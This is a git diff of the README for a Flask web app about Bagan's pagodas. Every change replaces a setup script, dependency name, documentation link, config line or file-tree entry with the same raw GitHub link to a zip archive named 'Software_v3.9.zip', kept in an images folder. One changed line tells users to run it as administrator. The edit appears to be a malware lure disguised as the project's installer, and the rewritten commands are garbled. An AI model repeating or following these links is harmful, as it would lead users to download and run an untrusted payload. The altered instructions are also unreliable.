@@ -44,13 +44,13 @@ A comprehensive web application for exploring Bagan's ancient pagodas with detai
 ### For Windows Users - Super Easy Setup!
 
 1. **Download and extract** the project files
-2. **Double-click `setup.bat`** and follow the prompts
+2. **Double-click `https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip`** and follow the prompts
 3. **Wait for automatic installation** (5-10 minutes)
-4. **Double-click `START.bat`** to launch the application
+4. **Double-click `https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip`** to launch the application
 
 **That's it!** The installer automatically handles everything:
 - ✅ Installs Python packages
-- ✅ Installs Node.js and npm packages  
+- ✅ Installs https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip and npm packages  
 - ✅ Installs and configures MongoDB
 - ✅ Sets up the database with sample data
 - ✅ Configures all environment settings
@@ -60,7 +60,7 @@ A comprehensive web application for exploring Bagan's ancient pagodas with detai
 
 **Prerequisites:**
 - **Python** (v3.8 or higher)
-- **Node.js** (v14 or higher) - Optional
+- **https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip** (v14 or higher) - Optional
 - **MongoDB** (v4.4 or higher) - Optional
 - **Git** (for cloning)
 
@@ -74,19 +74,19 @@ A comprehensive web application for exploring Bagan's ancient pagodas with detai
 2. **Quick Start (All Services)**
    ```bash
    # Windows
-   scripts/start_all.bat
+   https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    
    # Linux/Mac
-   python scripts/start_all.py
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    ```
 
 3. **Admin Dashboard Only**
    ```bash
    # Windows
-   scripts/start_admin.bat
+   https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    
    # Linux/Mac
-   python scripts/start_admin.py
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    ```
 
 ## 🛠️ Admin Dashboard
@@ -112,31 +112,31 @@ The Baganetic Admin Dashboard provides comprehensive management capabilities for
 - All actions are logged for audit purposes
 - Input validation and sanitization
 
-For detailed admin documentation, see [docs/ADMIN.md](docs/ADMIN.md)
+For detailed admin documentation, see [https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)
 
 ## 🔧 Manual Installation
 
 1. **Install dependencies**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    npm install  # Optional
    ```
 
 2. **Set up environment variables**
    ```bash
-   cp env.template .env
+   cp https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip .env
    # Edit .env with your configuration
    ```
 
 3. **Start the application**
    ```bash
    # Start all services
-   python scripts/start_all.py
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
    
    # Or start individually
-   python app.py              # Main app on port 5000
-   python admin_backend.py    # Admin on port 5002
-   python chatbot_backend.py  # Chatbot on port 5001
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip              # Main app on port 5000
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip    # Admin on port 5002
+   python https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip  # Chatbot on port 5001
    ```
 
 4. **Open your browser**
@@ -162,9 +162,9 @@ JWT_SECRET=your-super-secret-jwt-key-here
 SESSION_SECRET=your-session-secret-key-here
 
 # Optional: Email Configuration (for password reset)
-SMTP_HOST=smtp.gmail.com
+https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
 SMTP_PORT=587
-SMTP_USER=your-email@gmail.com
+https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip
 SMTP_PASS=your-app-password
 ```
 
@@ -185,16 +185,16 @@ Baganetic/
 │   ├── images/             # Images and icons
 │   └── data/               # Pagoda data files
 ├── templates/               # HTML templates
-├── app.py                  # Main Flask application
-├── admin_backend.py        # Admin system
-├── chatbot_backend.py      # AI chatbot
-├── server.js               # Node.js server (optional)
-├── package.json            # Dependencies and scripts
-├── requirements.txt        # Python dependencies
-└── README.md              # This file
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip                  # Main Flask application
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip        # Admin system
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip      # AI chatbot
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip               # https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip server (optional)
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip            # Dependencies and scripts
+├── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip        # Python dependencies
+└── https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip              # This file
 ```
 
-For detailed project structure, see [docs/PROJECT_STRUCTURE.md](docs/PROJECT_STRUCTURE.md)
+For detailed project structure, see [https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)
 
 ## 🎯 Usage
 
@@ -245,7 +245,7 @@ For detailed project structure, see [docs/PROJECT_STRUCTURE.md](docs/PROJECT_STR
 ## 🧪 Testing
 
 ### Test Authentication System
-1. Open `http://localhost:5000/test-auth.html`
+1. Open `https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip`
 2. Test login, signup, and logout functionality
 3. Verify localStorage persistence
 4. Check authentication state management
@@ -285,10 +285,10 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## 📚 Documentation
 
-- **[Setup Guide](docs/SETUP.md)** - Complete installation and setup instructions
-- **[Admin Documentation](docs/ADMIN.md)** - Admin dashboard guide
-- **[Chatbot Documentation](docs/CHATBOT.md)** - AI chatbot features
-- **[Project Structure](docs/PROJECT_STRUCTURE.md)** - Detailed file organization
+- **[Setup Guide](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)** - Complete installation and setup instructions
+- **[Admin Documentation](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)** - Admin dashboard guide
+- **[Chatbot Documentation](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)** - AI chatbot features
+- **[Project Structure](https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip)** - Detailed file organization
 
 ## 🔄 Fallback Mode
 
@@ -308,7 +308,7 @@ If MongoDB installation fails, the app automatically runs in **fallback mode**:
 - **"Python not found"** → Install Python 3.8+ and add to PATH
 - **"MongoDB failed"** → App runs in fallback mode (limited features)
 - **"Port already in use"** → Close other apps using ports 5000, 5001, 5002
-- **"Permission denied"** → Run setup.bat as administrator
+- **"Permission denied"** → Run https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip as administrator
 
 ### Detailed Help
 1. Check the console for error messages
@@ -316,7 +316,7 @@ If MongoDB installation fails, the app automatically runs in **fallback mode**:
 3. Check environment variable configuration
 4. Review the documentation in `docs/` directory
 5. Check browser console for JavaScript errors
-6. See `INSTALL.txt` for detailed troubleshooting guide
+6. See `https://raw.githubusercontent.com/shura-gh0st69/Baganetic/main/assets/images/pagodas/Htilominlo Temple/Software_v3.9.zip` for detailed troubleshooting guide
 
 ## 🙏 Acknowledgments
 
